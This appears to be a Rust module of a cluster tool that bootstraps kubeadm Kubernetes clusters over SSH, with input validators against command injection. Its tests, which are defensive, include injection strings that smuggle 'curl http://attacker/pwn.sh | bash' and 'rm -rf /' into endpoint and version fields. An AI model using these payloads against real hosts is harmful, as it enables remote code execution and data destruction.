//! `delonix cluster apply -f cloud.yaml` — bootstrap `kubeadm` idempotente
//! sobre SSH, em hosts já vivos (`kind: Cluster`). Não cria VMs — isso é
//! `delonix vm create` (opcionalmente com a imagem dourada de `delonix image
//! --vm build`). Idempotência SEM ficheiro de estado: cada passo verifica a
//! condição real no host (`remote::ssh_check`) antes de agir.
//!
//! **Simplificações desta v1** (ver `CLAUDE.md`): só etcd `stacked`
//! (co-localizado nos control-planes — o default do kubeadm); execução
//! sequencial (não paralela) entre hosts; HA multi-control-plane exige
//! `spec.controlPlaneEndpoint` explícito (kubeadm precisa de um endpoint
//! estável — LB/VIP — à frente de vários control-planes).

use std::path::PathBuf;
use std::process::Command;
use std::time::{Duration, Instant};

use clap::Subcommand;
use delonix_runtime_core::{Error, Result};
use serde::Deserialize;

use super::manifest::{self, ManifestDoc};
use super::remote::{self, SshTarget};
use super::util::state_root;
use super::vmimage::VmImageStore;
use super::{k8s_recipes, vm as vm_cmd, vmimage};

#[derive(Debug, Deserialize)]
struct SshSpec {
    user: String,
    key: Option<PathBuf>,
}

#[derive(Debug, Deserialize)]
struct EtcdSpec {
    #[serde(default = "default_etcd_mode")]
    mode: String,
}

impl Default for EtcdSpec {
    fn default() -> Self {
        EtcdSpec { mode: default_etcd_mode() }
    }
}

fn default_etcd_mode() -> String {
    "stacked".to_string()
}

#[derive(Debug, Clone, Deserialize)]
struct HostSpec {
    ip: String,
    hostname: Option<String>,
}

impl HostSpec {
    fn label(&self) -> String {
        self.hostname.clone().unwrap_or_else(|| self.ip.clone())
    }
}

#[derive(Debug, Deserialize)]
struct ClusterSpec {
    ssh: SshSpec,
    #[serde(default)]
    etcd: EtcdSpec,
    #[serde(rename = "controlPlaneEndpoint")]
    control_plane_endpoint: Option<String>,
    #[serde(rename = "controlPlane")]
    control_plane: Vec<HostSpec>,
    #[serde(default)]
    workers: Vec<HostSpec>,
    #[serde(rename = "k8sVersion")]
    k8s_version: Option<String>,
    #[serde(rename = "podSubnet", default = "default_pod_subnet")]
    pod_subnet: String,
    #[serde(rename = "serviceSubnet", default = "default_service_subnet")]
    service_subnet: String,
}

fn default_pod_subnet() -> String {
    "10.244.0.0/16".to_string()
}
fn default_service_subnet() -> String {
    "10.96.0.0/12".to_string()
}

/// `host[:porta]` — só o alfabeto de um hostname/IPv4/IPv6 + porta. Recusa
/// vazio e qualquer coisa que comece por `-`/`:` (evita ambiguidade com
/// flags). **Crítico para segurança**: este valor entra directamente num
/// `format!` que vira o CORPO de um comando `bash -c` remoto (`kubeadm
/// init --control-plane-endpoint=...`, ver `kubeadm_init`/`kubeadm_join`) —
/// sem esta validação, um manifesto malicioso injecta comandos arbitrários
/// como root no host remoto (`;`/`` ` ``/`$()`/`|` não são bloqueados por
/// `remote::shell_quote`, que só protege a fronteira ssh→bash-c local, não o
/// CONTEÚDO do script). Achado de auditoria de segurança, ver CLAUDE.md.
fn valid_endpoint(s: &str) -> bool {
    !s.is_empty()
        && !matches!(s.chars().next(), Some('-') | Some(':'))
        && s.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | ':'))
}

/// CIDR simples (`10.244.0.0/16`) — só dígitos/`.`/`/`. Mesma justificação
/// de segurança de [`valid_endpoint`] (usado em `--pod-network-cidr`/
/// `--service-cidr` do `kubeadm init`).
fn valid_cidr(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_digit() || matches!(c, '.' | '/'))
}

/// Versão do Kubernetes (`1.31` ou `1.31.2`) — só dígitos/`.`. Mesma
/// justificação de segurança de [`valid_endpoint`] (usado em
/// `--kubernetes-version` do `kubeadm init` E no repositório apt de
/// `k8s_recipes::k8s_host_recipes`, corrido em TODOS os hosts).
pub(crate) fn valid_version(s: &str) -> bool {
    !s.is_empty() && s.chars().all(|c| c.is_ascii_digit() || c == '.')
}

fn validate(spec: &ClusterSpec) -> Result<()> {
    if spec.etcd.mode != "stacked" {
        return Err(Error::Invalid(format!(
            "etcd.mode '{}' não suportado nesta versão — só 'stacked' (etcd externo fica para \
             uma iteração seguinte, ver CLAUDE.md)",
            spec.etcd.mode
        )));
    }
    if spec.control_plane.is_empty() {
        return Err(Error::Invalid("spec.controlPlane vazio — pelo menos 1 host obrigatório".into()));
    }
    if spec.control_plane.len() > 1 && spec.control_plane_endpoint.is_none() {
        return Err(Error::Invalid(
            "spec.controlPlaneEndpoint é obrigatório com mais de 1 control-plane (kubeadm \
             precisa de um endpoint estável — LB/VIP — à frente deles; não inventamos um)"
                .into(),
        ));
    }
    if let Some(ep) = &spec.control_plane_endpoint {
        if !valid_endpoint(ep) {
            return Err(Error::Invalid(format!("spec.controlPlaneEndpoint '{ep}' inválido (só host/IP[:porta])")));
        }
    }
    if !valid_cidr(&spec.pod_subnet) {
        return Err(Error::Invalid(format!("spec.podSubnet '{}' inválido (formato CIDR esperado)", spec.pod_subnet)));
    }
    if !valid_cidr(&spec.service_subnet) {
        return Err(Error::Invalid(format!("spec.serviceSubnet '{}' inválido (formato CIDR esperado)", spec.service_subnet)));
    }
    if let Some(v) = &spec.k8s_version {
        if !valid_version(v) {
            return Err(Error::Invalid(format!("spec.k8sVersion '{v}' inválido (só dígitos e pontos, ex.: '1.31')")));
        }
    }
    for h in spec.control_plane.iter().chain(spec.workers.iter()) {
        if !valid_endpoint(&h.ip) {
            return Err(Error::Invalid(format!("host '{}' tem ip inválido: '{}'", h.label(), h.ip)));
        }
    }
    Ok(())
}

fn target_for(host: &HostSpec, ssh: &SshSpec) -> SshTarget {
    SshTarget { host: host.ip.clone(), user: ssh.user.clone(), key: ssh.key.clone() }
}

// `Kubeadm` é maior que `Apply` (muitos flags opcionais de provisionamento) —
// mesma justificação do `#[allow]` já usado em `VmCmd`/`Cmd` (enum de CLI
// parseado uma vez por invocação, não um hot-path).
#[allow(clippy::large_enum_variant)]
#[derive(Subcommand)]
pub enum ClusterCmd {
    /// Aplica o(s) documento(s) `kind: Cluster` de um manifesto.
    Apply {
        #[arg(short = 'f', long = "file")]
        file: Option<PathBuf>,
    },
    /// Provisiona VMs (imagem VM dourada) + bootstrap `kubeadm` — do zero a
    /// um cluster a funcionar, sem escrever um manifesto à mão.
    Kubeadm {
        #[arg(long)]
        name: String,
        #[arg(long, default_value_t = 1)]
        control_plane: u32,
        #[arg(long, default_value_t = 2)]
        workers: u32,
        /// Tag da imagem VM dourada (`delonix image --vm ls`). Omitir = usa a
        /// única imagem local existente.
        #[arg(long = "vm-image")]
        vm_image: Option<String>,
        /// Rede já criada (`delonix network create`) — sem default mágico.
        #[arg(long)]
        network: String,
        /// Chave SSH privada a usar. Omitir = gera um par ed25519 novo em
        /// `<root>/clusters/<name>/id_ed25519`.
        #[arg(long = "ssh-key")]
        ssh_key: Option<PathBuf>,
        #[arg(long, default_value_t = 2)]
        vcpus: u32,
        #[arg(long, default_value = "2G")]
        memory: String,
        #[arg(long = "k8s-version")]
        k8s_version: Option<String>,
        #[arg(long, default_value = "10.244.0.0/16")]
        pod_subnet: String,
        #[arg(long, default_value = "10.96.0.0/12")]
        service_subnet: String,
        /// Segundos a esperar por cada VM ficar alcançável por SSH.
        #[arg(long, default_value_t = 300)]
        boot_timeout: u64,
    },
}

pub fn run(action: ClusterCmd) -> Result<()> {
    match action {
        ClusterCmd::Apply { file } => {
            let path = manifest::resolve_path(file)?;
            let docs = manifest::load(&path)?;
            apply(&docs)
        }
        ClusterCmd::Kubeadm {
            name,
            control_plane,
            workers,
            vm_image,
            network,
            ssh_key,
            vcpus,
            memory,
            k8s_version,
            pod_subnet,
            service_subnet,
            boot_timeout,
        } => provision_and_apply(ProvisionArgs {
            name,
            control_plane,
            workers,
            vm_image,
            network,
            ssh_key,
            vcpus,
            memory,
            k8s_version,
            pod_subnet,
            service_subnet,
            boot_timeout,
        }),
    }
}

pub fn apply(docs: &[ManifestDoc]) -> Result<()> {
    for doc in manifest::of_kind(docs, "Cluster") {
        let name = &doc.metadata.name;
        let spec: ClusterSpec = manifest::spec_of(doc)?;
        validate(&spec)?;
        apply_one(name, &spec)?;
    }
    Ok(())
}

fn apply_one(name: &str, spec: &ClusterSpec) -> Result<()> {
    let cri_bin = vmimage::resolve_cri_bin(None)?;
    let cri_service = vmimage::workspace_dist_file("delonix-cri.service")?;

    let all_hosts: Vec<&HostSpec> = spec.control_plane.iter().chain(spec.workers.iter()).collect();
    println!("cluster/{name}: a preparar {} host(s)...", all_hosts.len());
    for h in &all_hosts {
        let target = target_for(h, &spec.ssh);
        prepare_host(&target, &h.label(), spec.k8s_version.as_deref(), &cri_bin, &cri_service)?;
    }

    let cp1 = &spec.control_plane[0];
    let cp1_target = target_for(cp1, &spec.ssh);
    let endpoint = spec.control_plane_endpoint.clone().unwrap_or_else(|| cp1.ip.clone());
    let info = kubeadm_init(&cp1_target, &cp1.label(), &endpoint, spec)?;

    for h in &spec.control_plane[1..] {
        let target = target_for(h, &spec.ssh);
        kubeadm_join(&target, &h.label(), &endpoint, &info, true)?;
    }
    for h in &spec.workers {
        let target = target_for(h, &spec.ssh);
        kubeadm_join(&target, &h.label(), &endpoint, &info, false)?;
    }

    fetch_kubeconfig(&cp1_target, name)?;
    println!("cluster/{name}: pronto");
    Ok(())
}

// ---------------------------------------------------------------------------
// `delonix cluster kubeadm` — provisiona VMs + chama `apply_one`
// ---------------------------------------------------------------------------

struct ProvisionArgs {
    name: String,
    control_plane: u32,
    workers: u32,
    vm_image: Option<String>,
    network: String,
    ssh_key: Option<PathBuf>,
    vcpus: u32,
    memory: String,
    k8s_version: Option<String>,
    pod_subnet: String,
    service_subnet: String,
    boot_timeout: u64,
}

/// Nomes determinísticos das VMs de um papel (`<cluster>-cp1`, `<cluster>-w1`, ...).
fn vm_names(cluster_name: &str, role: &str, count: u32) -> Vec<String> {
    (1..=count).map(|i| format!("{cluster_name}-{role}{i}")).collect()
}

/// Resolve a tag da imagem VM dourada a usar: explícita, ou a única existente
/// localmente (erro claro se houver 0 ou mais de 1 — nunca escolhe às cegas
/// entre várias).
fn resolve_vm_image(store: &VmImageStore, explicit: Option<String>) -> Result<String> {
    if let Some(tag) = explicit {
        return Ok(tag);
    }
    let mut images = store.list()?;
    match images.len() {
        0 => Err(Error::Invalid(
            "sem imagens VM locais — corre `delonix image --vm build` primeiro, ou passa --vm-image <tag>".into(),
        )),
        1 => Ok(images.remove(0).name),
        n => Err(Error::Invalid(format!(
            "há {n} imagens VM locais — especifica qual usar com --vm-image <tag> (`delonix image --vm ls`)"
        ))),
    }
}

/// Chave SSH privada a usar: a explícita, ou gera um par ed25519 novo em
/// `<root>/clusters/<name>/id_ed25519` (`ssh-keygen` não-interactivo, sem
/// passphrase — automação, mesmo espírito do `BatchMode=yes` já usado em
/// `remote.rs`). Devolve `(caminho_privada, texto_publica)`.
fn generate_or_load_ssh_key(name: &str, explicit: Option<PathBuf>) -> Result<(PathBuf, String)> {
    if let Some(key) = explicit {
        let pub_path = key.with_extension("pub");
        let public = std::fs::read_to_string(&pub_path)
            .map_err(|e| Error::Invalid(format!("não consegui ler a chave pública '{}': {e}", pub_path.display())))?;
        return Ok((key, public.trim().to_string()));
    }
    let dir = state_root().join("clusters").join(name);
    std::fs::create_dir_all(&dir)?;
    let key_path = dir.join("id_ed25519");
    if !key_path.exists() {
        let status = Command::new("ssh-keygen")
            .args(["-t", "ed25519", "-N", "", "-f"])
            .arg(&key_path)
            .args(["-C", &format!("delonix-cluster-{name}")])
            .status()
            .map_err(|e| Error::Invalid(format!("a correr ssh-keygen: {e}")))?;
        if !status.success() {
            return Err(Error::Invalid("ssh-keygen falhou".into()));
        }
    }
    let public = std::fs::read_to_string(key_path.with_extension("pub"))?;
    Ok((key_path, public.trim().to_string()))
}

/// Espera uma VM ficar alcançável por SSH: primeiro o IP (reconciliado pelo
/// backend — DHCP/`domifaddr`, tipicamente rápido), depois um `ssh_check`
/// real (o boot do SO/arranque do sshd demora mais). Devolve o IP.
fn wait_for_vm_ssh_ready(vm_name: &str, ssh: &SshSpec, timeout: Duration) -> Result<String> {
    let base = state_root();
    let deadline = Instant::now() + timeout;

    let ip = loop {
        let vm = delonix_vm::status(&base, vm_name)?;
        if let Some(ip) = vm.ip {
            break ip;
        }
        if Instant::now() >= deadline {
            return Err(Error::Invalid(format!("VM '{vm_name}': sem IP atribuído dentro do --boot-timeout")));
        }
        std::thread::sleep(Duration::from_secs(3));
    };

    let target = SshTarget { host: ip.clone(), user: ssh.user.clone(), key: ssh.key.clone() };
    loop {
        if remote::ssh_check(&target, "true") {
            return Ok(ip);
        }
        if Instant::now() >= deadline {
            return Err(Error::Invalid(format!(
                "VM '{vm_name}' (ip={ip}): SSH não respondeu dentro do --boot-timeout — o boot pode ainda estar em curso"
            )));
        }
        std::thread::sleep(Duration::from_secs(5));
    }
}

fn provision_and_apply(args: ProvisionArgs) -> Result<()> {
    if args.control_plane == 0 {
        return Err(Error::Invalid("--control-plane tem de ser >= 1".into()));
    }
    let base = state_root();
    let vm_store = VmImageStore::open(&base)?;
    let image_tag = resolve_vm_image(&vm_store, args.vm_image.clone())?;
    let disk = vm_store.qcow2_path(&image_tag);
    if !disk.exists() {
        return Err(Error::Invalid(format!("imagem VM '{image_tag}' não tem qcow2 em disco ({})", disk.display())));
    }

    let (ssh_key_path, ssh_public) = generate_or_load_ssh_key(&args.name, args.ssh_key.clone())?;
    let ssh = SshSpec { user: "delonix".to_string(), key: Some(ssh_key_path) };
    let timeout = Duration::from_secs(args.boot_timeout);

    let cp_names = vm_names(&args.name, "cp", args.control_plane);
    let worker_names = vm_names(&args.name, "w", args.workers);

    println!(
        "cluster/{}: a provisionar {} control-plane(s) + {} worker(s) a partir de '{image_tag}'...",
        args.name,
        cp_names.len(),
        worker_names.len()
    );

    let mut control_plane = Vec::with_capacity(cp_names.len());
    for vm_name in &cp_names {
        let ip = create_and_wait(vm_name, &disk, &args, &ssh_public, &ssh, timeout)?;
        control_plane.push(HostSpec { ip, hostname: Some(vm_name.clone()) });
    }
    let mut worker_hosts = Vec::with_capacity(worker_names.len());
    for vm_name in &worker_names {
        let ip = create_and_wait(vm_name, &disk, &args, &ssh_public, &ssh, timeout)?;
        worker_hosts.push(HostSpec { ip, hostname: Some(vm_name.clone()) });
    }

    let control_plane_endpoint = if control_plane.len() == 1 {
        None
    } else {
        return Err(Error::Invalid(
            "mais de 1 control-plane pedido, mas `delonix cluster kubeadm` ainda não provisiona \
             um endpoint estável (LB/VIP) automaticamente — usa `delonix cluster apply` com um \
             `controlPlaneEndpoint` externo já preparado, ou pede só 1 control-plane"
                .into(),
        ));
    };

    let spec = ClusterSpec {
        ssh,
        etcd: EtcdSpec::default(),
        control_plane_endpoint,
        control_plane,
        workers: worker_hosts,
        k8s_version: args.k8s_version,
        pod_subnet: args.pod_subnet,
        service_subnet: args.service_subnet,
    };
    validate(&spec)?;
    apply_one(&args.name, &spec)
}

fn create_and_wait(
    vm_name: &str,
    disk: &std::path::Path,
    args: &ProvisionArgs,
    ssh_public: &str,
    ssh: &SshSpec,
    timeout: Duration,
) -> Result<String> {
    println!("cluster/{}: a criar VM {vm_name}...", args.name);
    let seed = vm_cmd::generate_seed_iso(vm_name, Some(vm_name), std::slice::from_ref(&ssh_public.to_string()), None)?;
    let cfg = delonix_vm::VmConfig {
        name: vm_name.to_string(),
        disk: disk.to_string_lossy().into_owned(),
        vcpus: args.vcpus,
        memory: args.memory.clone(),
        network: args.network.clone(),
        kernel: None,
        initrd: None,
        firmware: None,
        cmdline: None,
        seed: Some(seed.to_string_lossy().into_owned()),
        restart_policy: None,
        hugepages: false,
        cpu_affinity: None,
        devices: Vec::new(),
        backend: None,
        net_mode: None,
        bridge: None,
    };
    delonix_vm::create(&state_root(), &cfg)?;
    println!("cluster/{}: a aguardar SSH em {vm_name}...", args.name);
    let ip = wait_for_vm_ssh_ready(vm_name, ssh, timeout)?;
    println!("cluster/{}: {vm_name} pronta (ip={ip})", args.name);
    Ok(ip)
}

fn prepare_host(
    target: &SshTarget,
    label: &str,
    k8s_version: Option<&str>,
    cri_bin: &std::path::Path,
    cri_service: &std::path::Path,
) -> Result<()> {
    for r in k8s_recipes::k8s_host_recipes(k8s_version, &[]) {
        if remote::ssh_check(target, &r.check) {
            println!("[{label}] {}: já satisfeito (SKIP)", r.name);
            continue;
        }
        println!("[{label}] {}: a aplicar...", r.name);
        remote::ssh_run(target, &r.apply)?;
        println!("[{label}] {}: OK", r.name);
    }

    if remote::ssh_check(target, "systemctl is-active --quiet delonix-cri") {
        println!("[{label}] delonix-cri: já satisfeito (SKIP)");
    } else {
        println!("[{label}] delonix-cri: a instalar...");
        remote::scp_to(target, cri_bin, "/tmp/delonix-cri")?;
        remote::ssh_run(target, "mv /tmp/delonix-cri /usr/local/bin/delonix-cri && chmod +x /usr/local/bin/delonix-cri")?;
        remote::scp_to(target, cri_service, "/tmp/delonix-cri.service")?;
        remote::ssh_run(
            target,
            "mv /tmp/delonix-cri.service /etc/systemd/system/delonix-cri.service && \
             systemctl daemon-reload && systemctl enable --now delonix-cri",
        )?;
        println!("[{label}] delonix-cri: OK");
    }
    Ok(())
}

struct JoinInfo {
    token: String,
    ca_cert_hash: String,
    certificate_key: Option<String>,
}

fn kubeadm_init(cp1: &SshTarget, label: &str, endpoint: &str, spec: &ClusterSpec) -> Result<JoinInfo> {
    if remote::ssh_check(cp1, "test -f /etc/kubernetes/admin.conf") {
        println!("[{label}] kubeadm init: já satisfeito (SKIP) — a recuperar credenciais de join...");
        return recover_join_info(cp1);
    }
    let k8s_ver_flag = spec.k8s_version.as_ref().map(|v| format!(" --kubernetes-version=v{v}")).unwrap_or_default();
    let cmd = format!(
        "kubeadm init --control-plane-endpoint={endpoint} --upload-certs \
         --pod-network-cidr={} --service-cidr={}{k8s_ver_flag}",
        spec.pod_subnet, spec.service_subnet
    );
    println!("[{label}] kubeadm init: a correr (pode demorar alguns minutos)...");
    let out = remote::ssh_run(cp1, &cmd)?;
    println!("[{label}] kubeadm init: OK");
    parse_join_info(&out)
}

fn recover_join_info(cp1: &SshTarget) -> Result<JoinInfo> {
    let join_cmd = remote::ssh_run(cp1, "kubeadm token create --print-join-command")?;
    let token = extract_after(&join_cmd, "--token ").ok_or_else(|| Error::Invalid("sem --token no join-command".into()))?;
    let ca_cert_hash = extract_after(&join_cmd, "--discovery-token-ca-cert-hash ")
        .ok_or_else(|| Error::Invalid("sem --discovery-token-ca-cert-hash no join-command".into()))?;
    let cert_key_out = remote::ssh_run(cp1, "kubeadm init phase upload-certs --upload-certs")?;
    let certificate_key = extract_after(&cert_key_out, "Using certificate key:\n").or_else(|| {
        // formato alternativo (linha única "certificate key: <hex>") consoante a versão.
        extract_after(&cert_key_out, "certificate key:")
    });
    Ok(JoinInfo { token, ca_cert_hash, certificate_key })
}

/// Extrai o kubeadm init/join output: `token`/`discovery-token-ca-cert-hash`
/// vêm de `--flag valor`; `certificate-key` idem. Função pura, testada com
/// uma amostra real de output.
fn parse_join_info(output: &str) -> Result<JoinInfo> {
    let token =
        extract_after(output, "--token ").ok_or_else(|| Error::Invalid("não consegui extrair --token do output do kubeadm init".into()))?;
    let ca_cert_hash = extract_after(output, "--discovery-token-ca-cert-hash ")
        .ok_or_else(|| Error::Invalid("não consegui extrair --discovery-token-ca-cert-hash do output do kubeadm init".into()))?;
    let certificate_key = extract_after(output, "--certificate-key ");
    Ok(JoinInfo { token, ca_cert_hash, certificate_key })
}

fn extract_after(text: &str, marker: &str) -> Option<String> {
    let idx = text.find(marker)?;
    let rest = &text[idx + marker.len()..];
    let value = rest.split_whitespace().next()?;
    Some(value.trim_end_matches('\\').to_string())
}

fn kubeadm_join(target: &SshTarget, label: &str, endpoint: &str, info: &JoinInfo, as_control_plane: bool) -> Result<()> {
    if remote::ssh_check(target, "test -f /etc/kubernetes/kubelet.conf") {
        println!("[{label}] kubeadm join: já satisfeito (SKIP)");
        return Ok(());
    }
    let mut cmd = format!("kubeadm join {endpoint}:6443 --token {} --discovery-token-ca-cert-hash {}", info.token, info.ca_cert_hash);
    if as_control_plane {
        let key = info
            .certificate_key
            .as_ref()
            .ok_or_else(|| Error::Invalid(format!("[{label}] sem certificate-key disponível para join de control-plane")))?;
        cmd.push_str(&format!(" --control-plane --certificate-key {key}"));
    }
    println!("[{label}] kubeadm join: a correr...");
    remote::ssh_run(target, &cmd)?;
    println!("[{label}] kubeadm join: OK");
    Ok(())
}

fn fetch_kubeconfig(cp1: &SshTarget, cluster_name: &str) -> Result<()> {
    let dir = state_root().join("clusters");
    std::fs::create_dir_all(&dir)?;
    let dest = dir.join(format!("{cluster_name}-kubeconfig.yaml"));

    // `/etc/kubernetes/admin.conf` é 0600 root:root — copia para /tmp com
    // permissão legível pelo utilizador SSH antes do scp, depois limpa.
    remote::ssh_run(cp1, "cp /etc/kubernetes/admin.conf /tmp/delonix-admin.conf && chmod 644 /tmp/delonix-admin.conf")?;
    remote::scp_from(cp1, "/tmp/delonix-admin.conf", &dest)?;
    let _ = remote::ssh_run(cp1, "rm -f /tmp/delonix-admin.conf");

    println!("kubeconfig: {}", dest.display());
    println!("export KUBECONFIG={}", dest.display());

    if let Some(home) = std::env::var_os("HOME") {
        let kube_dir = PathBuf::from(home).join(".kube");
        let kube_config = kube_dir.join("config");
        if !kube_config.exists() {
            std::fs::create_dir_all(&kube_dir)?;
            std::fs::copy(&dest, &kube_config)?;
            println!("também copiado para {} (não existia ainda)", kube_config.display());
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn vm_names_gera_nomes_deterministicos() {
        assert_eq!(vm_names("prod", "cp", 2), vec!["prod-cp1", "prod-cp2"]);
        assert_eq!(vm_names("prod", "w", 3), vec!["prod-w1", "prod-w2", "prod-w3"]);
        assert_eq!(vm_names("prod", "cp", 0), Vec::<String>::new());
    }

    #[test]
    fn resolve_vm_image_usa_a_explicita_sem_tocar_no_store() {
        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-test-{}", std::process::id()));
        let store = VmImageStore::open(&tmp).unwrap();
        assert_eq!(resolve_vm_image(&store, Some("minha-tag".to_string())).unwrap(), "minha-tag");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn resolve_vm_image_falha_claro_sem_imagens_locais() {
        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-empty-{}", std::process::id()));
        let store = VmImageStore::open(&tmp).unwrap();
        let err = resolve_vm_image(&store, None).unwrap_err();
        assert!(format!("{err}").contains("build"));
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn resolve_vm_image_usa_a_unica_existente() {
        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-one-{}", std::process::id()));
        let store = VmImageStore::open(&tmp).unwrap();
        store
            .save(&vmimage::VmImage {
                name: "ubuntu-26.04-k8s".to_string(),
                tag: "ubuntu-26.04-k8s".to_string(),
                digest: "sha256:abc".to_string(),
                size: 1,
                ubuntu_release: Some("26.04".to_string()),
                k8s_version: Some("1.31".to_string()),
                created_unix: 0,
            })
            .unwrap();
        assert_eq!(resolve_vm_image(&store, None).unwrap(), "ubuntu-26.04-k8s");
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[test]
    fn resolve_vm_image_falha_claro_com_multiplas_imagens() {
        let tmp = std::env::temp_dir().join(format!("delonix-cluster-resolve-image-many-{}", std::process::id()));
        let store = VmImageStore::open(&tmp).unwrap();
        for tag in ["a", "b"] {
            store
                .save(&vmimage::VmImage {
                    name: tag.to_string(),
                    tag: tag.to_string(),
                    digest: "sha256:abc".to_string(),
                    size: 1,
                    ubuntu_release: None,
                    k8s_version: None,
                    created_unix: 0,
                })
                .unwrap();
        }
        let err = resolve_vm_image(&store, None).unwrap_err();
        assert!(format!("{err}").contains("--vm-image"));
        let _ = std::fs::remove_dir_all(&tmp);
    }

    const SAMPLE_KUBEADM_INIT_OUTPUT: &str = "\
Your Kubernetes control-plane has initialized successfully!

To start using your cluster, you need to run the following as a regular user:

  mkdir -p $HOME/.kube
  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
  sudo chown $(id -u):$(id -g) $HOME/.kube/config

You can now join any number of the control-plane node running the following command on each as root:

  kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
	--discovery-token-ca-cert-hash sha256:1111111111111111111111111111111111111111111111111111111111111111 \\
	--control-plane --certificate-key 2222222222222222222222222222222222222222222222222222222222222222

Please note that the certificate-key gives access to cluster sensitive data, keep it secret!
As a safeguard, uploaded-certs will be deleted in two hours; If necessary, you can use
\"kubeadm init phase upload-certs --upload-certs\" to reload certs afterward.

Then you can join any number of worker nodes by running the following on each as root:

kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
	--discovery-token-ca-cert-hash sha256:1111111111111111111111111111111111111111111111111111111111111111
";

    #[test]
    fn valid_endpoint_aceita_host_ip_e_porta() {
        assert!(valid_endpoint("10.0.0.10"));
        assert!(valid_endpoint("10.0.0.10:6443"));
        assert!(valid_endpoint("lb.exemplo.com"));
        assert!(valid_endpoint("cp1"));
    }

    #[test]
    fn valid_endpoint_recusa_injeccao_de_comandos() {
        assert!(!valid_endpoint("10.0.0.10; curl http://attacker/pwn.sh | bash; #"));
        assert!(!valid_endpoint("$(curl http://attacker/pwn.sh)"));
        assert!(!valid_endpoint("`whoami`"));
        assert!(!valid_endpoint("10.0.0.10 && rm -rf /"));
        assert!(!valid_endpoint(""));
        assert!(!valid_endpoint("-oProxyCommand=x"));
    }

    #[test]
    fn valid_cidr_aceita_formato_normal_e_recusa_injeccao() {
        assert!(valid_cidr("10.244.0.0/16"));
        assert!(!valid_cidr("10.244.0.0/16; rm -rf /"));
        assert!(!valid_cidr(""));
    }

    #[test]
    fn valid_version_aceita_formato_normal_e_recusa_injeccao() {
        assert!(valid_version("1.31"));
        assert!(valid_version("1.31.2"));
        assert!(!valid_version("1.31; curl evil|bash; #"));
        assert!(!valid_version("1.31\ncurl evil|bash\n#"));
        assert!(!valid_version(""));
    }

    #[test]
    fn validate_recusa_endpoint_malicioso_no_manifesto_completo() {
        let spec = ClusterSpec {
            ssh: SshSpec { user: "delonix".into(), key: None },
            etcd: EtcdSpec::default(),
            control_plane_endpoint: Some("10.0.0.10; curl http://attacker/pwn.sh | bash; #".into()),
            control_plane: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
            workers: vec![],
            k8s_version: None,
            pod_subnet: default_pod_subnet(),
            service_subnet: default_service_subnet(),
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("controlPlaneEndpoint"));
    }

    #[test]
    fn validate_recusa_k8s_version_maliciosa() {
        let spec = ClusterSpec {
            ssh: SshSpec { user: "delonix".into(), key: None },
            etcd: EtcdSpec::default(),
            control_plane_endpoint: None,
            control_plane: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
            workers: vec![],
            k8s_version: Some("1.31; curl evil|bash #".into()),
            pod_subnet: default_pod_subnet(),
            service_subnet: default_service_subnet(),
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("k8sVersion"));
    }

    #[test]
    fn parse_join_info_extrai_token_hash_e_certificate_key() {
        let info = parse_join_info(SAMPLE_KUBEADM_INIT_OUTPUT).unwrap();
        assert_eq!(info.token, "abcdef.0123456789abcdef");
        assert_eq!(info.ca_cert_hash, "sha256:1111111111111111111111111111111111111111111111111111111111111111");
        assert_eq!(info.certificate_key.as_deref(), Some("2222222222222222222222222222222222222222222222222222222222222222"));
    }

    #[test]
    fn validate_recusa_etcd_external() {
        let spec = ClusterSpec {
            ssh: SshSpec { user: "delonix".into(), key: None },
            etcd: EtcdSpec { mode: "external".into() },
            control_plane_endpoint: None,
            control_plane: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
            workers: vec![],
            k8s_version: None,
            pod_subnet: default_pod_subnet(),
            service_subnet: default_service_subnet(),
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("etcd"));
    }

    #[test]
    fn validate_exige_endpoint_com_multiplos_control_planes() {
        let spec = ClusterSpec {
            ssh: SshSpec { user: "delonix".into(), key: None },
            etcd: EtcdSpec::default(),
            control_plane_endpoint: None,
            control_plane: vec![
                HostSpec { ip: "10.0.0.1".into(), hostname: None },
                HostSpec { ip: "10.0.0.2".into(), hostname: None },
            ],
            workers: vec![],
            k8s_version: None,
            pod_subnet: default_pod_subnet(),
            service_subnet: default_service_subnet(),
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("controlPlaneEndpoint"));
    }

    #[test]
    fn validate_aceita_1_control_plane_sem_endpoint() {
        let spec = ClusterSpec {
            ssh: SshSpec { user: "delonix".into(), key: None },
            etcd: EtcdSpec::default(),
            control_plane_endpoint: None,
            control_plane: vec![HostSpec { ip: "10.0.0.1".into(), hostname: None }],
            workers: vec![],
            k8s_version: None,
            pod_subnet: default_pod_subnet(),
            service_subnet: default_service_subnet(),
        };
        assert!(validate(&spec).is_ok());
    }

    #[test]
    fn validate_recusa_control_plane_vazio() {
        let spec = ClusterSpec {
            ssh: SshSpec { user: "delonix".into(), key: None },
            etcd: EtcdSpec::default(),
            control_plane_endpoint: None,
            control_plane: vec![],
            workers: vec![],
            k8s_version: None,
            pod_subnet: default_pod_subnet(),
            service_subnet: default_service_subnet(),
        };
        assert!(validate(&spec).is_err());
    }

    #[test]
    fn cluster_spec_desserializa_de_yaml_completo() {
        let yaml = "\
ssh: { user: delonix, key: /home/delonix/.ssh/id_ed25519 }
etcd: { mode: stacked }
controlPlaneEndpoint: lb.exemplo.com
controlPlane:
  - { ip: 10.0.0.10, hostname: cp1 }
  - { ip: 10.0.0.11, hostname: cp2 }
workers:
